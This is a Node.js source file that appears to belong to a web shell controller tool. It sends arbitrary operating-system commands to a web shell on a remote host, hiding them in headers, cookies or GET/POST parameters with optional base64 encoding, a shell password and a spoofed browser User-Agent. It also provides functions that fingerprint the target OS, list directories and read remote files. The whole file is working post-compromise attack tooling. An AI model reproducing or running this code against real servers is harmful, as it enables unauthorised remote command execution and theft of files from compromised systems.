const axios = require("axios");
const COMMAND_MAP = require("./reqTypes").COMMAND_MAP;
const { LIST_DIR, WORKING_DIR, READ_FILE } = require("./reqTypes");
const { WINDOWS, MAC, LINUX } = require("./osTypes");
const { parseMultiline, parseListDirResponse, parseWorkingDir } = require("./utils");

const generateConfig = (shell, command) => {
	var config = {
		headers: {
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0",
		},
		params: {},
		data: {},
		timeout: 30000
	};

	switch(shell.commandParamType) {
		case "header":
			config["headers"][shell.commandParam] = command;

			if(shell.passwordEnabled) {
				config["headers"][shell.passwordParam] = shell.password;
			}

			break;
		case "cookie":
			const commandCookie = `${shell.commandParam}=${command}`;

			if(shell.passwordEnabled) {
				authCookie = `${shell.passwordParam}=${shell.password}`;
				config["headers"]["Cookie"] = commandCookie.concat("; ", authCookie);
			} else {
				config["headers"]["Cookie"] = commandCookie;
			}

			break;
		case "POST":
			config["data"][shell.commandParam] = command;			

			if(shell.passwordEnabled) {
				config["data"][shell.passwordParam] = shell.password;
			}

			break;
		case "GET":
			config["params"][shell.commandParam] = command;			

			if(shell.passwordEnabled) {
				config["params"][shell.passwordParam] = shell.password;
			}

			break;
		default:
			console.error("Invalid param type!");
			break;
	}
	
	return config;
}

const encodeCommand = (command, shellEncoding) => {
	var encoded = command;

	switch(shellEncoding) {
		case "base64":
			encoded = Buffer.from(command).toString("base64");
			break;
		default:
			console.error("Unsupported command encoding!");
			break;
	}

	return encoded;
}

/** 
 * Sends a predefined request type
 * 
 * @param {WebShellSchema} shell The details of the selected shell
 * @param {String} reqType The name of the request type, as defined in `reqTypes.js`
 * @exports 
 */
const sendRequest = async (shell, reqType, args = []) => {
	var command = COMMAND_MAP[reqType][shell.os];
	var expectedArgs = COMMAND_MAP[reqType]["args"];

	if(args.length === expectedArgs && args.length > 0) {
		const argsString = args.join(" ");
		command = `${command} ${argsString}`;
	}

	return sendArbitraryCommand(shell, command);
}

/** @exports */
const sendArbitraryCommand = async (shell, command) => {
	try {
		var request = encodeCommand(command, shell.commandEncoding);

		const config = generateConfig(shell, request);
		var response;

		if(shell.commandParamType === "POST") {
			response = await axios.post(shell.ipOrHostname, config);
		} else {
			response = await axios.get(shell.ipOrHostname, config);
		}

		return response;
	} catch (error) {
		return null;
	}
	
}

/** 
 * Gets the pwd directory listing from the remote, and parses it
 * 
 * @param {WebShellSchema} shell The details of the selected shell
 * @exports 
 */
const listWorkingDir = async (shell) => {
	const response = await sendRequest(shell, LIST_DIR);
	const dir = parseListDirResponse(response.data);

	return dir;
}

/** 
 * Gets a directory listing from the remote, and parses it
 * 
 * @param {WebShellSchema} shell The details of the selected shell
 * @exports 
 */
const listDir = async (shell, dir) => {
	const response = await sendRequest(shell, LIST_DIR, [dir]);
	const dirListing = parseListDirResponse(response.data);

	return dirListing;
}

/** 
 * Determines what operating system the target is running
 * 
 * @param {WebShellSchema} shell The details of the selected shell
 * @exports 
 */
const determineOS = async (shell) => {
	const command = encodeCommand("uname -a", shell.commandEncoding);

	const config = generateConfig(shell, command);
	var response;

	if(shell.commandParamType === "POST") {
		response = await axios.post(shell.ipOrHostname, config);
	} else {
		response = await axios.get(shell.ipOrHostname, config);
	}

	var os = LINUX;

	// Windows does not have `uname`
	if(response.data.includes("not recognized")) {
		os = WINDOWS;
	} else if(response.data.includes("Linux")) {
		os = LINUX;
	} else {
		os = MAC;
	}

	return os;
};

/** 
 * Gets the current working directory of the remote
 * 
 * @param {WebShellSchema} shell The details of the selected shell
 * @exports 
 */
const workingDir = async (shell) => {
	const response = await sendRequest(shell, WORKING_DIR);
	const dirName = parseWorkingDir(response.data);

	return dirName;
};

/**
 * Gets the (text encoded) contents of the given file
 * 
 * @param 	{WebShellSchema} 	shell The details of the selected shell
 * @param 	{String}					file	The path to the file we want to read
 * @returns	{Array[String]}					The lines of the file
 * @exports
 */
const readFile = async (shell, file) => {
	const response = await sendRequest(shell, READ_FILE, [file]);
	const lines = parseMultiline(response.data);

	return lines;
}

module.exports = { sendRequest, sendArbitraryCommand, determineOS, listWorkingDir, listDir, workingDir, readFile };